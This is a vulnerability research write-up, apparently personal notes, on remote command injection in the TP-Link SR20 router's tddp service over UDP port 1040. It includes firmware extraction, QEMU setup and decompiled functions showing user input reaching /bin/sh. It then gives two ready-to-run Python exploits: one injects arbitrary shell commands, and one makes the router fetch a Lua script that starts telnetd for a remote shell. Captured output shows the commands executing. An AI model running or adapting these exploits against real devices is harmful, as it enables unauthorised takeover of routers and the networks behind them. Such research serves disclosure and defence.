Ref
- https://paper.seebug.org/879/#arm-qemu
- https://www.anquanke.com/post/id/183202
- https://mjg59.dreamwidth.org/51672.html
- https://www.osslab.com.tw/wp-content/uploads/2019/06/2019-%E8%87%BA%E7%81%A3%E8%B3%87%E5%AE%89%E5%A4%A7%E6%9C%83%E6%BC%94%E8%AC%9B%E5%AE%9A%E7%A8%BF.pdf

Version
- tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin

Down from
- http://web.archive.org/web/20190227004853/https://static.tp-link.com/2018/201806/20180611/SR20(US)_V1_180518.zip

# Extract firmware
```bash
binwalk -Me tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin

user@user-virtual-machine:~/frimeware/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/squashfs-root/usr/bin$ file tddp 
tddp: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped

```

Run in Qemu
```bash
qemu-img resize ./debian_wheezy_armhf_standard.qcow2 32G


user@user-virtual-machine:~/arm_debian$ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic -smp 4

```

# Reverse tddp

Call stack
- sub_16418
	- sub_15E74
		- sub_A580
		- sub_91DC


```c

int __fastcall sub_16418(int *a1)
{
  int v2; // r3
  int v3; // r0
  __int16 v4; // r2
  int v5; // r3
  int v6; // r0
  __int16 v7; // r2
  int v8; // r3
  _BYTE *v9; // r3
  int v10; // r3
  size_t n; // [sp+10h] [bp-2Ch] BYREF
  socklen_t addr_len; // [sp+14h] [bp-28h] BYREF
  struct sockaddr addr; // [sp+18h] [bp-24h] BYREF
  ssize_t v16; // [sp+28h] [bp-14h]
  int v17; // [sp+2Ch] [bp-10h]
  unsigned __int8 *v18; // [sp+30h] [bp-Ch]
  int v19; // [sp+34h] [bp-8h]

  v19 = 0;
  addr_len = 16;
  n = 0;
  memset(a1 + 45083, 0, 0xAFC9u);
  memset(a1 + 82, 0, 0xAFC9u);
  v18 = a1 + 45083;
  v17 = a1 + 82;
  v16 = recvfrom(a1[9], a1 + 45083, 0xAFC8u, 0, &addr, &addr_len);
  if ( v16 < 0 )
    return sub_13018(-10106, "receive error");
  sub_15458(a1);
  a1[11] |= 1u;
  v2 = *v18;
  if ( v2 == 1 )
  {
    v6 = sub_15AD8(a1, &addr);
    if ( v6 )
    {
      a1[13] = sub_9340(v6);
      v19 = sub_15E74(a1, &n); //a1 shoud be the struct save data

```

```c
int __fastcall sub_15E74(int a1, _DWORD *a2){

	swtich (*a1+450894) //a1+450894 must be 0x31
	// menas recv's 2sd bytes should be 0x31
	.........
    case 0x31:  
      printf("[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n", "tddp_parserVerOneOpt", 692);
      v9 = sub_A580(a1);   //here
      break;


    default:
      printf(
        "[%s():%d] TDDPv1: receive unknown type: %d\n",
        "tddp_parserVerOneOpt",
        713,
        *(unsigned __int8 *)(a1 + 45084));
      *(_BYTE *)(v7 + 1) = v8[1];
      *(_BYTE *)(v7 + 3) = 2;
      *(_BYTE *)(v7 + 2) = 2;
      *(_DWORD *)(v7 + 4) = htonl(0);
      v3 = ((unsigned __int8)v8[9] << 8) | (unsigned __int8)v8[8];
      *(_BYTE *)(v7 + 8) = v8[8];
      *(_BYTE *)(v7 + 9) = HIBYTE(v3);
      v9 = -10302;
      break;
  }
  *a2 = ntohl((*(unsigned __int8 *)(v7 + 7) << 24) | (*(unsigned __int8 *)(v7 + 6) << 16) | (*(unsigned __int8 *)(v7 + 5) << 8) | *(unsigned __int8 *)(v7 + 4))
      + 12;
  return v9;
}
```

```c
int __fastcall sub_A580(int a1)
{
  void *v1; // r0
  __int16 v2; // r2
  int v3; // r3
  int v4; // r3
  __int64 v5; // r0
  char name[64]; // [sp+8h] [bp-E4h] BYREF
  char v10[64]; // [sp+48h] [bp-A4h] BYREF
  char s[64]; // [sp+88h] [bp-64h] BYREF
  int v12; // [sp+C8h] [bp-24h]
  _BYTE *v13; // [sp+CCh] [bp-20h]
  int v14; // [sp+D0h] [bp-1Ch]
  int v15; // [sp+D4h] [bp-18h]
  char *v16; // [sp+D8h] [bp-14h]
  int v17; // [sp+DCh] [bp-10h]
  int v18; // [sp+E0h] [bp-Ch]
  char *v19; // [sp+E4h] [bp-8h]

  v18 = 1;
  v17 = 4;
  memset(s, 0, sizeof(s));
  memset(v10, 0, sizeof(v10));
  v1 = memset(name, 0, sizeof(name));
  v16 = 0;
  v15 = luaL_newstate(v1);
  
  v19 = (char *)(a1 + a3);
  v14 = a1 + 82;
  v13 = (_BYTE *)(a1 + 45083);  //offset 45083 is the command address ,also appear near recvfrom
  v12 = a1 + 82;
  *(_BYTE *)(a1 + 83) = 49;
  *(_DWORD *)(v12 + 4) = htonl(0);
  *(_BYTE *)(v12 + 2) = 2;
  v2 = ((unsigned __int8)v13[9] << 8) | (unsigned __int8)v13[8];
  v3 = v12;
  *(_BYTE *)(v12 + 8) = v13[8];
  *(_BYTE *)(v3 + 9) = HIBYTE(v2);
  if ( *v13 == 1 ) //addr a1+45083== 1
  {
    v19 += 12;  //offset 12
    v14 += 12;
  }
  else
  {
    v19 += 28;
    v14 += 28;
  }
  if ( !v19 ) //addr a1=45083+12 !=0
    goto LABEL_20;
  sscanf(v19, "%[^;];%s", s, v10); // only check ; , after ; needs some str to bypass the if case below 
  if ( !s[0] || !v10[0] )  //v10 can't be empty
  {
    printf("[%s():%d] luaFile or configFile len error.\n", "tddp_cmd_configSet", 555);
LABEL_20:
    *(_BYTE *)(v12 + 3) = 3;
    return sub_13018(-10303, "config set failed");
  }
  v16 = inet_ntoa(*(struct in_addr *)(a1 + 4)); //ip
  sub_91DC("cd /tmp;tftp -gr %s %s &", s, v16);  //execute 
  sprintf(name, "/tmp/%s", s); //
  while ( v17 > 0 )
  {
    sleep(1u);
    if ( !access(name, 0) ) //try access the file
      break;
    --v17;
  }
  if ( !v17 )
  {
    printf("[%s():%d] lua file [%s] don't exsit.\n", "tddp_cmd_configSet", 574, name);
    goto LABEL_20;
  }
  if ( v15 )  //execute the lua
  {
    luaL_openlibs(v15);
    v4 = luaL_loadfile(v15, name);
    if ( !v4 )
      v4 = lua_pcall(v15, 0, -1, 0);
    lua_getfield(v15, -10002, "config_test", v4);
    lua_pushstring(v15, v10);
    lua_pushstring(v15, v16);
    lua_call(v15, 2, 1);
    v5 = lua_tonumber(v15, -1);
    v18 = sub_16EC4(v5, HIDWORD(v5));
    lua_settop(v15, -2);
  }

....
}

```

```c
int sub_91DC(const char *a1, ...)
{
  char *argv; // [sp+8h] [bp-11Ch] BYREF
  const char *v4; // [sp+Ch] [bp-118h]
  char *v5; // [sp+10h] [bp-114h]
  int v6; // [sp+14h] [bp-110h]
  int stat_loc; // [sp+18h] [bp-10Ch] BYREF
  char s[256]; // [sp+1Ch] [bp-108h] BYREF
  __pid_t pid; // [sp+11Ch] [bp-8h]
  va_list varg_r1; // [sp+12Ch] [bp+8h] BYREF

  va_start(varg_r1, a1);
  pid = 0;
  stat_loc = 0;
  argv = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  vsprintf(s, a1, varg_r1);  //s will concat the command to execute
  printf("[%s():%d] cmd: %s \r\n", "tddp_execCmd", 72, s);
  pid = fork();
  if ( pid < 0 )
    return -1;
  if ( !pid )
  {
    argv = "sh";
    v4 = "-c";
    v5 = s;
    v6 = 0;
    execve("/bin/sh", &argv, 0);
    exit(127);
  }
  while ( waitpid(pid, &stat_loc, 0) == -1 )
  {
    if ( *_errno_location() != 4 )
      return -1;
  }
  return 0;
}

```


Test for vulnerable logics

```
a1+45083 = 0x1
a1+45084 = 0x31
... padding with 0
a1+45083+0xc = "command"
```

Command must satisfy the constraints

- `sscanf(v19, "%[^;];%s", s, v10);`  
	- only check ';' , after ';' needs some str to bypass the if case below 
- `if ( !s[0] || !v10[0] )`  
	- v10 can't be empty
- `sub_91DC("cd /tmp;tftp -gr %s %s &", s, v16);`
	- v16 is ip addr
	- s is the str v19 before ';' from sscanf

Then construct the exploit string

```
user@user-virtual-machine:~$ gcc exp.c -w ; ./a.out 
expstr:7777|whoami&&echo ;666
s:7777|whoami&&echo 
v10:666
[tddp_execCmd():72] cmd: cd /tmp;tftp -gr 7777|whoami&&echo  127.0.0.1 & 
/bin/sh sh -c cd /tmp;tftp -gr 7777|whoami&&echo  127.0.0.1 &
```

exp.c
```c=
#include <stdio.h>
#include <stdarg.h>
int exe(char *a1, ...)
{
	char *argv; // [sp+8h] [bp-11Ch] BYREF
	const char *v4; // [sp+Ch] [bp-118h]
	char *v5; // [sp+10h] [bp-114h]
	int v6; // [sp+14h] [bp-110h]
	int stat_loc; // [sp+18h] [bp-10Ch] BYREF
	char s[256]; // [sp+1Ch] [bp-108h] BYREF
	
	  
	
	va_list varg_r1;
	va_start(varg_r1, a1);
	vsprintf(s, a1, varg_r1); // s will concat the command to execute
	printf("[%s():%d] cmd: %s \r\n", "tddp_execCmd", 72, s);
	// argv = "sh -c";
	// v5 = s;
	printf("/bin/sh sh -c %s\n", s);
	// execve("/bin/sh", &argv, 0);
}
int main()
{
	char str[30] = "7777|whoami&&echo ;666";
	char ip[30] = "127.0.0.1";
	char v10[64]; // [sp+48h] [bp-A4h] BYREF
	char s[64]; // [sp+88h] [bp-64h] BYREF
	memset(s, 0, sizeof(s));
	memset(v10, 0, sizeof(v10));
	printf("expstr:%s\n", str);
	sscanf(str, "%[^;];%s", s, v10);
	printf("s:%s\nv10:%s\n", s, v10);
	
	if (!s[0] || !v10[0])
	{
		printf("[%s():%d] luaFile or configFile len error.\n", "tddp_cmd_configSet", 555);
	}
	exe("cd /tmp;tftp -gr %s %s &", s, ip);

}
```



# Exploit

```python
from pwn import *
from socket import *
import sys

tddp_port = 1040
recv_port = 12345
ip = '10.10.10.2'
command = sys.argv[1]
s_send = socket(AF_INET,SOCK_DGRAM,0)
payload = '\x01\x31'.ljust(12,'\x00')
payload+= "7777|%s&&echo ;555"%command

pb=bytes(payload,'ascii')
s_send.sendto(pb,(ip,tddp_port))
s_send.close()

```

Attack side
```bash
python3 exp.py uname
```

Server side
```
/usr/bin # ./tddp 
[tddp_taskEntry():151] tddp task start
callback username
callback password
[tddp_parserVerOneOpt():692] TDDPv1: receive CMD_FTEST_CONFIG
[tddp_execCmd():72] cmd: cd /tmp;tftp -gr 7777|uname&&echo  10.10.10.1 & 
BusyBox v1.19.4 (2018-05-18 20:52:39 PDT) multi-call binary.

Usage: tftp [OPTIONS] HOST [PORT]

Transfer a file from/to tftp server

        -l FILE Local FILE
        -r FILE Remote FILE
        -g      Get file
        -p      Put file

Linux
10.10.10.1
[tddp_cmd_configSet():574] lua file [/tmp/7777|uname&&echo ] don't exsit.
```


Because from `sub_A580` can expect it will use `tftp` to down the lua script from remote and execute it

So can host tftp service and lua scrpt, specify the file name as exploit string.
Here is another exploit
```python
#!/usr/bin/python3

# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0

# Create a file in your tftp directory with the following contents:
#
#function config_test(config)
#  os.execute("telnetd -l /bin/login.sh")
#end
#
# Execute script as poc.py remoteaddr filename

import sys
import binascii
import socket

port_send = 1040
port_receive = 61000

tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(('', port_receive))

# Send a request
sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s;arbitrary" % sys.argv[2]
packet = packet + argument.encode()
sock_send.sendto(packet, (sys.argv[1], port_send))
sock_send.close()

response, addr = sock_receive.recvfrom(1024)
r = response.encode('hex')
print(r)
```

Note
After successful exploit once, can't not get another successful exploit ,needs wait some time